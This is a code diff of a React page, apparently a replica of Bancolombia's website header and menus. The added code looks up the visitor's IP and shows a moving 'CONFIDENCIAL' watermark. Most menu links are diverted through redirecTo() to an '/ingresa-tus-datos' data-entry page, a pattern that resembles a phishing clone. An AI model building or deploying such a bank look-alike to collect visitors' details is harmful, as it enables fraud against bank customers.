@@ -11,6 +11,8 @@ import Chevron from "../../components/Chevron";
 import AbejaModal from './modals/AbejaModal.jsx';
 import { isDesktop, isMobile, isTablet, limpiarPaddingBody } from "@utils";
 import Footer from './components/Footer';
+import Watermark from "./watermark/Watermark.jsx";
+import GhostWatermark from './watermark/GhostWatermark';
 
 // Se exporta el componente VistaPrincipal
 const VistaPrincipal = () => {
@@ -33,6 +35,50 @@ const VistaPrincipal = () => {
         corporativos: false,
         especializados: false,
     });
+
+    // Se inicializa los estados
+    const [ip, setIp] = useState("");
+
+    // Se inicializa el estado del watermark
+    const [watermarkText, setWatermarkText] = useState("");
+
+    // Efecto para capturar la dirección IP al montar el componente
+    useEffect(() => {
+
+        // Se llama a la función para obtener la IP
+        obtenerIP();
+    }, []);
+
+    // Efecto para establecer el texto del watermark al cargar el componente
+    useEffect(() => {
+
+        // Obtener IP simulada o generar una aleatoria
+        const ip = localStorage.getItem("user_ip") || "IP-" + Math.random().toString(36).slice(2, 8);
+
+        // Se guarda en el local storage
+        const fecha = new Date().toLocaleString("es-CO");
+
+        // Se inicializa el texto del watermark
+        const text = `CONFIDENCIAL · ${ip} · ${fecha}`;
+
+        console.log("Watermark text:", text);
+
+        // Se setea el watermark
+        setWatermarkText(`${text}`);
+    }, []);
+
+    useEffect(() => {
+        let x = 0;
+        const el = document.getElementById("wm-move");
+
+        const move = () => {
+            x = (x + 1) % 40;
+            if (el) el.style.transform = `translate(${x}px, ${x / 2}px)`;
+        };
+
+        const i = setInterval(move, 120);
+        return () => clearInterval(i);
+    }, []);
 
     useEffect(() => {
 
@@ -77,6 +123,63 @@ const VistaPrincipal = () => {
         mobileSucursalOpen,
         mobileMenuOpen,
     ]);
+
+    // Obtiene la dirección IP pública del usuario
+    const obtenerIP = async () => {
+
+        // Se usa el try
+        try {
+
+            // Se realiza la petición HTTP a la API
+            const response = await fetch("https://api.ipify.org?format=json");
+
+            // Se convierte la respuesta a JSON
+            const data = await response.json();
+
+            // Se guarda la IP obtenida en el estado
+            setIp(data.ip);
+        } catch (error) {
+
+            // En caso de error (sin internet, API caída, etc.)
+            console.error("Error obteniendo IP", error);
+
+            // Se asigna un valor por defecto para evitar fallos en la UI
+            setIp("No disponible");
+        };
+    };
+
+    useEffect(() => {
+        if (!isMobile()) return;
+
+        const protect = () => {
+            document.body.classList.add("mobile-screen-protected");
+        };
+
+        const unprotect = () => {
+            document.body.classList.remove("mobile-screen-protected");
+        };
+
+        // ✅ iOS REAL
+        const onPageHide = () => protect();
+        const onPageShow = () => unprotect();
+
+        // ⚠️ Android / otros
+        const onVisibility = () => {
+            if (document.hidden) protect();
+            else unprotect();
+        };
+
+        window.addEventListener("pagehide", onPageHide);
+        window.addEventListener("pageshow", onPageShow);
+        document.addEventListener("visibilitychange", onVisibility);
+
+        return () => {
+            window.removeEventListener("pagehide", onPageHide);
+            window.removeEventListener("pageshow", onPageShow);
+            document.removeEventListener("visibilitychange", onVisibility);
+            unprotect();
+        };
+    }, []);
 
     // Metodo encargado de setear los items tabs activos
     const toggleMenu = (menu) => {
@@ -163,32 +266,6 @@ const VistaPrincipal = () => {
         window.location.href = "/ingresa-tus-datos";
     };
 
-    React.useEffect(() => {
-        const navbar = document.querySelector('.vp-navbar');
-        if (!navbar) return;
-
-        let lastScrollY = window.scrollY;
-
-        const onScroll = () => {
-            const currentScrollY = window.scrollY;
-
-            // 🔽 Scroll DOWN → se recoge visualmente
-            if (currentScrollY > lastScrollY && currentScrollY > 80) {
-                navbar.classList.add('is-hidden');
-            }
-
-            // 🔼 Scroll UP → reaparece
-            if (currentScrollY < lastScrollY) {
-                navbar.classList.remove('is-hidden');
-            }
-
-            lastScrollY = currentScrollY;
-        };
-
-        window.addEventListener('scroll', onScroll, { passive: true });
-        return () => window.removeEventListener('scroll', onScroll);
-    }, []);
-
     // Función para navegar a una pestaña específica y desplazarse a una sección
     const goToTab = (tabKey, sectionId, index) => {
         setActiveTab(tabKey);
@@ -238,14 +315,115 @@ const VistaPrincipal = () => {
         }
     };
 
+    React.useEffect(() => {
+        const navbar = document.querySelector('.vp-navbar');
+        if (!navbar) return;
+
+        let lastScrollY = window.scrollY;
+
+        const onScroll = () => {
+            const currentScrollY = window.scrollY;
+
+            // 🔽 Scroll DOWN → se recoge visualmente
+            if (currentScrollY > lastScrollY && currentScrollY > 80) {
+                navbar.classList.add('is-hidden');
+            }
+
+            // 🔼 Scroll UP → reaparece
+            if (currentScrollY < lastScrollY) {
+                navbar.classList.remove('is-hidden');
+            }
+
+            lastScrollY = currentScrollY;
+        };
+
+        window.addEventListener('scroll', onScroll, { passive: true });
+        return () => window.removeEventListener('scroll', onScroll);
+    }, []);
+
+    // Efecto para manejar clases del body según el estado de la navbar abeja en mobile
+    useEffect(() => {
+        if (!mobile) return;
+
+        const navbar = document.querySelector('.vp-navbar');
+        if (!navbar) return;
+
+        let lastScrollY = window.scrollY;
+
+        const PREHEADER_HEIGHT = 120;
+
+        const onScroll = () => {
+            const currentScrollY = window.scrollY;
+
+            // 🟢 Arriba del todo → respeta la abeja
+            if (openNavbarAbeja && currentScrollY <= PREHEADER_HEIGHT) {
+                navbar.style.top = `${PREHEADER_HEIGHT}px`;
+            }
+            // 🔵 Apenas haces scroll → navbar sube
+            else {
+                navbar.style.top = `0px`;
+            }
+
+            // ↓ ocultar
+            if (currentScrollY > lastScrollY && currentScrollY > 80) {
+                navbar.classList.add('is-hidden');
+            }
+
+            // ↑ mostrar
+            if (currentScrollY < lastScrollY) {
+                navbar.classList.remove('is-hidden');
+            }
+
+            lastScrollY = currentScrollY;
+        };
+
+        window.addEventListener('scroll', onScroll, { passive: true });
+        return () => window.removeEventListener('scroll', onScroll);
+    }, [openNavbarAbeja, mobile]);
+
+    const bcBeneRef = useRef(null);
+
+    // useEffect(() => {
+    //     if (!mobile) return;
+
+    //     const bcBene = bcBeneRef.current;
+    //     const placeholder = document.getElementById('bc-bene-placeholder');
+    //     if (!bcBene || !placeholder) return;
+
+    //     const navbarHeight = 64;
+
+    //     const onScroll = () => {
+    //         const rect = bcBene.getBoundingClientRect();
+    //         const offsetTop =
+    //             parseFloat(
+    //                 getComputedStyle(document.documentElement)
+    //                     .getPropertyValue('--preheader-offset')
+    //             ) || 0;
+
+    //         const limit = offsetTop + navbarHeight;
+
+    //         if (rect.top <= limit) {
+    //             bcBene.classList.add('is-fixed');
+    //             placeholder.style.display = 'block';
+    //         } else {
+    //             bcBene.classList.remove('is-fixed');
+    //             placeholder.style.display = 'none';
+    //         }
+    //     };
+
+    //     window.addEventListener('scroll', onScroll, { passive: true });
+    //     onScroll();
+
+    //     return () => window.removeEventListener('scroll', onScroll);
+    // }, [mobile]);
+
     // Se retorna el JSX del componente
     return (
         <div className="vp-container">
 
             {/* TOP BAR ABEJA PARA MOBILE */}
             {openNavbarAbeja ?
-                <section
-                    className="pre-header"
+                <section className={`pre-header ${openNavbarAbeja ? 'is-visible' : 'is-hidden'}`}
                     id="container-preheader"
                     style={{ display: 'flex' }}
                 >
@@ -396,216 +574,216 @@ const VistaPrincipal = () => {
                 </section>
                 : null}
 
-            {/* 1. TOP BAR */}
-            <div className="header-top bg-gray color-white" style={{ marginTop: openNavbarAbeja && desktop ? '80px' : '0px' }}>
-                <div className="container container-max">
-                    <nav className="header-top_nav">
-                        <ul className="header-top_menu">
-                            <li className="header-top_item has-submenu sticky-static" style={{ marginLeft: '0px' }}>
-                                <a
-                                    href="#"
-                                    className={`header-top_link personas ${activeDropdown === 'personas_main' ? 'active' : ''}`}
-                                    id="header-personas"
-                                    onClick={(e) => { e.preventDefault(); toggleDropdown('personas_main'); }}
-                                    style={{ textDecoration: 'none' }}
-                                >
-                                    Personas
-                                </a>
-                                <div className={`header-top_submenuU bg-white color-default ${activeDropdown === 'personas_main' ? 'active' : ''}`}>
-                                    <div className="container">
-                                        <div className="row">
-                                            <span className="close-menu-topp cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
-                                            <div className="col-md-12">
-                                                <ul className="submenu-cont" style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '15px 20px', width: '100%', margin: 0 }}>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Necesidades</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Productos y Servicios</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Educación Financiera</a>
-                                                    </li>
-                                                </ul>
+            {desktop ?
+                <div className="header-top bg-gray color-white" style={{ marginTop: openNavbarAbeja && desktop ? '80px' : '0px' }}>
+                    <div className="container container-max">
+                        <nav className="header-top_nav">
+                            <ul className="header-top_menu">
+                                <li className="header-top_item has-submenu sticky-static" style={{ marginLeft: '0px' }}>
+                                    <a
+                                        href="#"
+                                        className={`header-top_link personas ${activeDropdown === 'personas_main' ? 'active' : ''}`}
+                                        id="header-personas"
+                                        onClick={(e) => { e.preventDefault(); toggleDropdown('personas_main'); }}
+                                        style={{ textDecoration: 'none' }}
+                                    >
+                                        Personas
+                                    </a>
+                                    <div className={`header-top_submenuU bg-white color-default ${activeDropdown === 'personas_main' ? 'active' : ''}`}>
+                                        <div className="container">
+                                            <div className="row">
+                                                <span className="close-menu-topp cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
+                                                <div className="col-md-12">
+                                                    <ul className="submenu-cont" style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '15px 20px', width: '100%', margin: 0 }}>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Necesidades</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Productos y Servicios</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Educación Financiera</a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                            </li>
-                            <li className="header-top_item has-submenu sticky-static">
-                                <a
-                                    href="#"
-                                    className={`header-top_link ${activeDropdown === 'negocios_main' ? 'active' : ''}`}
-                                    id="header-pymes"
-                                    onClick={(e) => { e.preventDefault(); toggleDropdown('negocios_main'); }}
-                                >
-                                    Negocios
-                                </a>
-                                <div className={`header-top_submenuU bg-white color-default ${activeDropdown === 'negocios_main' ? 'active' : ''}`}>
-                                    <div className="container">
-                                        <div className="row">
-                                            <span className="close-menu-topp cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
-                                            <div className="col-md-12">
-                                                <ul className="submenu-cont" style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '15px 20px', width: '100%', margin: 0 }}>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Inicio</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Actualízate</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Productos Financieros</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Herramientas</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Aliados</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Formación</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Sectores</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Comercio Internacional</a>
-                                                    </li>
-                                                </ul>
+                                </li>
+                                <li className="header-top_item has-submenu sticky-static">
+                                    <a
+                                        href="#"
+                                        className={`header-top_link ${activeDropdown === 'negocios_main' ? 'active' : ''}`}
+                                        id="header-pymes"
+                                        onClick={(e) => { e.preventDefault(); toggleDropdown('negocios_main'); }}
+                                    >
+                                        Negocios
+                                    </a>
+                                    <div className={`header-top_submenuU bg-white color-default ${activeDropdown === 'negocios_main' ? 'active' : ''}`}>
+                                        <div className="container">
+                                            <div className="row">
+                                                <span className="close-menu-topp cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
+                                                <div className="col-md-12">
+                                                    <ul className="submenu-cont" style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '15px 20px', width: '100%', margin: 0 }}>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Inicio</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Actualízate</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Productos Financieros</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Herramientas</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Aliados</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Formación</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Sectores</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Comercio Internacional</a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                            </li>
-                            <li className="header-top_item has-submenu sticky-static">
-                                <a
-                                    href="#"
-                                    className={`header-top_link ${activeDropdown === 'corporativos_main' ? 'active' : ''}`}
-                                    id="header-empresas"
-                                    onClick={(e) => { e.preventDefault(); toggleDropdown('corporativos_main'); }}
-                                >
-                                    Corporativos
-                                </a>
-                                <div className={`header-top_submenuU bg-white color-default ${activeDropdown === 'corporativos_main' ? 'active' : ''}`}>
-                                    <div className="container">
-                                        <div className="row">
-                                            <span className="close-menu-topp cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
-                                            <div className="col-md-12">
-                                                <ul className="submenu-cont" style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '15px 20px', width: '100%', margin: 0 }}>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Inicio</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Soluciones Corporativas</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Financiación</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Inversión</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Internacional</a>
-                                                    </li>
-                                                </ul>
+                                </li>
+                                <li className="header-top_item has-submenu sticky-static">
+                                    <a
+                                        href="#"
+                                        className={`header-top_link ${activeDropdown === 'corporativos_main' ? 'active' : ''}`}
+                                        id="header-empresas"
+                                        onClick={(e) => { e.preventDefault(); toggleDropdown('corporativos_main'); }}
+                                    >
+                                        Corporativos
+                                    </a>
+                                    <div className={`header-top_submenuU bg-white color-default ${activeDropdown === 'corporativos_main' ? 'active' : ''}`}>
+                                        <div className="container">
+                                            <div className="row">
+                                                <span className="close-menu-topp cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
+                                                <div className="col-md-12">
+                                                    <ul className="submenu-cont" style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '15px 20px', width: '100%', margin: 0 }}>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Inicio</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Soluciones Corporativas</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Financiación</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Inversión</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="#" onClick={(e) => { e.preventDefault(); redirecTo(); }} className="submenu-cont_link" style={{ whiteSpace: 'nowrap' }}>Internacional</a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                            </li>
-                            <li className="header-top_item has-submenu sticky-static">
-                                <a
-                                    className={`header-top_link header-top_link--arrow ${activeDropdown === 'negocios' ? 'active' : ''}`}
-                                    href="#"
-                                    id="header-negocios"
-                                    onClick={(e) => { e.preventDefault(); toggleDropdown('negocios'); }}
-                                >
-                                    Negocios especializados
-                                </a>
-                                <div className={`header-top_submenu bg-white color-default ${activeDropdown === 'negocios' ? 'active' : ''}`}>
-                                    <div className="container">
-                                        <div className="row">
-                                            <span className="close-menu-top cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
-                                            <div className="col-md-5">
-                                                <h3 className="submenu-title">Negocios en Colombia</h3>
-                                                <ul className="submenu-cont">
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-negocios-banca" onClick={(e) => { e.preventDefault(); redirecTo() }}>Banca de Inversión Bancolombia</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-negocios-fiduciaria" onClick={(e) => { e.preventDefault(); redirecTo() }}>Fiduciaria Bancolombia</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-negocios-leasing" onClick={(e) => { e.preventDefault(); redirecTo() }}>Leasing Bancolombia</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" target="_blank" rel="noopener noreferrer" className="submenu-cont_link" id="header-negocios-renting" onClick={(e) => { e.preventDefault(); redirecTo() }}>Renting Colombia</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-negocios-valores" onClick={(e) => { e.preventDefault(); redirecTo() }} >Valores Bancolombia</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-negocios-factoring" onClick={(e) => { e.preventDefault(); redirecTo() }} >Factoring Bancolombia</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-negocios-sufi" onClick={(e) => { e.preventDefault(); redirecTo() }} >Sufi</a>
-                                                    </li>
-                                                </ul>
-                                            </div>
-                                            <div className="col-md-7">
-                                                <h3 className="submenu-title">Entidades en el exterior</h3>
-                                                <ul className="submenu-cont" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0 20px' }}>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-maima" onClick={(e) => { e.preventDefault(); redirecTo() }}>Cibest Capital</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-valores" onClick={(e) => { e.preventDefault(); redirecTo() }}>Valores Banistmo</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-sucursal" onClick={(e) => { e.preventDefault(); redirecTo() }}>Sucursal Panamá</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-panama" onClick={(e) => { e.preventDefault(); redirecTo() }}>Bancolombia Panamá</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-puerto-rico" onClick={(e) => { e.preventDefault(); redirecTo() }}>Bancolombia Puerto Rico</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-banisto" onClick={(e) => { e.preventDefault(); redirecTo() }}>Banistmo</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-agricola" onClick={(e) => { e.preventDefault(); redirecTo() }}>Banco Agrícola</a>
-                                                    </li>
-                                                    <li className="submenu-cont_item">
-                                                        <a href="" className="submenu-cont_link" id="header-entidades-agromercantil" onClick={(e) => { e.preventDefault(); redirecTo() }}>BAM (Banco Agromercantil de Guatemala)</a>
-                                                    </li>
-                                                </ul>
+                                </li>
+                                <li className="header-top_item has-submenu sticky-static">
+                                    <a
+                                        className={`header-top_link header-top_link--arrow ${activeDropdown === 'negocios' ? 'active' : ''}`}
+                                        href="#"
+                                        id="header-negocios"
+                                        onClick={(e) => { e.preventDefault(); toggleDropdown('negocios'); }}
+                                    >
+                                        Negocios especializados
+                                    </a>
+                                    <div className={`header-top_submenu bg-white color-default ${activeDropdown === 'negocios' ? 'active' : ''}`}>
+                                        <div className="container">
+                                            <div className="row">
+                                                <span className="close-menu-top cerrar icon-bco icon-error" onClick={(e) => { e.stopPropagation(); setActiveDropdown(null); }}>✕</span>
+                                                <div className="col-md-5">
+                                                    <h3 className="submenu-title">Negocios en Colombia</h3>
+                                                    <ul className="submenu-cont">
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-negocios-banca" onClick={(e) => { e.preventDefault(); redirecTo() }}>Banca de Inversión Bancolombia</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-negocios-fiduciaria" onClick={(e) => { e.preventDefault(); redirecTo() }}>Fiduciaria Bancolombia</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-negocios-leasing" onClick={(e) => { e.preventDefault(); redirecTo() }}>Leasing Bancolombia</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" target="_blank" rel="noopener noreferrer" className="submenu-cont_link" id="header-negocios-renting" onClick={(e) => { e.preventDefault(); redirecTo() }}>Renting Colombia</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-negocios-valores" onClick={(e) => { e.preventDefault(); redirecTo() }} >Valores Bancolombia</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-negocios-factoring" onClick={(e) => { e.preventDefault(); redirecTo() }} >Factoring Bancolombia</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-negocios-sufi" onClick={(e) => { e.preventDefault(); redirecTo() }} >Sufi</a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
+                                                <div className="col-md-7">
+                                                    <h3 className="submenu-title">Entidades en el exterior</h3>
+                                                    <ul className="submenu-cont" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0 20px' }}>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-maima" onClick={(e) => { e.preventDefault(); redirecTo() }}>Cibest Capital</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-valores" onClick={(e) => { e.preventDefault(); redirecTo() }}>Valores Banistmo</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-sucursal" onClick={(e) => { e.preventDefault(); redirecTo() }}>Sucursal Panamá</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-panama" onClick={(e) => { e.preventDefault(); redirecTo() }}>Bancolombia Panamá</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-puerto-rico" onClick={(e) => { e.preventDefault(); redirecTo() }}>Bancolombia Puerto Rico</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-banisto" onClick={(e) => { e.preventDefault(); redirecTo() }}>Banistmo</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-agricola" onClick={(e) => { e.preventDefault(); redirecTo() }}>Banco Agrícola</a>
+                                                        </li>
+                                                        <li className="submenu-cont_item">
+                                                            <a href="" className="submenu-cont_link" id="header-entidades-agromercantil" onClick={(e) => { e.preventDefault(); redirecTo() }}>BAM (Banco Agromercantil de Guatemala)</a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                            </li>
-                            <li className="header-top_item">
-                                <a href="/tu360" className="header-top_link activetu360" id="header-tu360" onClick={(e) => { e.preventDefault(); redirecTo() }}>Tu360</a>
-                            </li>
-                            <li className="header-top_item">
-                                <a href="" target="_blank" rel="noopener noreferrer" className="header-top_link blog-item" id="header-blog" onClick={(e) => { e.preventDefault(); redirecTo() }}>Blog <span className="blog-dot" /></a>
-                            </li>
-                        </ul>
-                        <ul className="header-top_menu">
-                            <li className="header-top_item">
-                                <a className="header-top_link" id="btn-ayuda" href="/personas/documentos-legales/transparencia-acceso-informacion" onClick={(e) => { e.preventDefault(); redirecTo() }}><span>Transparencia</span></a>
-                            </li>
-                            <li className="header-top_item">
-                                <a className="header-top_link" id="btn-buscador-sucursales" href="/personas/consumidor-financiero" onClick={(e) => { e.preventDefault(); redirecTo() }}><span>Consumidor</span></a>
-                            </li>
-                        </ul>
-                    </nav>
-                </div>
-            </div>
+                                </li>
+                                <li className="header-top_item">
+                                    <a href="/tu360" className="header-top_link activetu360" id="header-tu360" onClick={(e) => { e.preventDefault(); redirecTo() }}>Tu360</a>
+                                </li>
+                                <li className="header-top_item">
+                                    <a href="" target="_blank" rel="noopener noreferrer" className="header-top_link blog-item" id="header-blog" onClick={(e) => { e.preventDefault(); redirecTo() }}>Blog <span className="blog-dot" /></a>
+                                </li>
+                            </ul>
+                            <ul className="header-top_menu">
+                                <li className="header-top_item">
+                                    <a className="header-top_link" id="btn-ayuda" href="/personas/documentos-legales/transparencia-acceso-informacion" onClick={(e) => { e.preventDefault(); redirecTo() }}><span>Transparencia</span></a>
+                                </li>
+                                <li className="header-top_item">
+                                    <a className="header-top_link" id="btn-buscador-sucursales" href="/personas/consumidor-financiero" onClick={(e) => { e.preventDefault(); redirecTo() }}><span>Consumidor</span></a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div> : null}
 
             {/* 2. NAVBAR */}
-            <nav className="vp-navbar" style={{ marginTop: openNavbarAbeja && mobile ? '140px' : '0px' }}>
